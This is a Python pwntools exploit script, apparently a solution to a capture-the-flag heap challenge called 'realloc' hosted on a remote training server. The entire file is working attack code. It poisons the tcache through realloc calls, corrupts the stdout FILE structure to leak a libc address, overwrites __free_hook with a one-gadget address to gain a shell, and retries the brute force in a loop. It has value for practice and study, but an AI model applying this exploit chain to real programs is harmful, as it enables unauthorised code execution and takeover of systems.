from pwn import *


def run():
    # p = process('./realloc')
    p = remote('node4.buuoj.cn', 25377)
    elf = ELF('./realloc')
    lib = elf.libc

    def choice(id_):
        p.recvuntil(b'>>')
        p.sendline(id_)

    def add(size_, mess):
        choice(b'1')
        p.recvuntil(b'?')
        p.sendline(str(int(size_)).encode())
        p.recvuntil(b'?')
        p.send(mess)

    def delete():
        choice(b'2')

    add(0x70, b'aaaa')
    add(0, b'a')
    add(0x100, b'aaaa')
    add(0, b'a')
    add(0xa0, b'ccc')
    add(0, b'a')
    add(0x100, b'a')
    [delete() for i in range(7)]
    add(0, b'a')
    add(0x70, b'aaaa')
    add(0x180, b'a' * 0x78 + p64(0x41) + p16(0xc760))
    add(0, b'a')
    add(0x100, b'a')
    add(0, b'a')
    payload = p64(0xfbad1887) + p64(0) * 3 + p8(0x58)
    add(0x100, payload)

    try:
        base_addr = u64(p.recvuntil(b'\x7f', timeout=0.1)[-6:].ljust(8, b'\00')) - lib.sym['_IO_file_jumps']
        if base_addr == -0x3e82a0:
            return 0
    except:
        print(hex(base_addr))

    key = [0x4f2c5, 0x4f322, 0x10a38c]
    ogg = base_addr + key[1]
    free_hook = base_addr + lib.sym['__free_hook']

    choice(b'666')
    add(0x170, b'aaaa')
    add(0, b'a')
    add(0x200, b'aaaa')
    add(0, b'a')
    add(0x1b0, b'ccc')
    add(0, b'a')
    add(0x200, b'a')
    [delete() for i in range(7)]
    add(0, b'a')
    add(0x170, b'aaaa')
    add(0x380, b'a' * 0x178 + p64(0x41) + p64(free_hook))
    add(0, b'a')
    add(0x200, b'a')
    add(0, b'a')
    add(0x200, p64(ogg))
    delete()
    # gdb.attach(p)
    p.interactive()

if __name__ == '__main__':
    while True:
        run()